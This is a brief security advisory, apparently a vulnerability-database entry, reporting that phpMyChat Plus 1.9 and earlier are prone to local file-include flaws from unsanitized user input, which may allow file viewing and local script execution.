phpMyChat is prone to multiple local file-include vulnerabilities because it fails to properly sanitize user-supplied input.

Exploiting these issues may allow an unauthorized user to view files and execute local scripts.

phpMyChat Plus 1.9 and prior versions are vulnerable to these issues; other versions may also be affected.
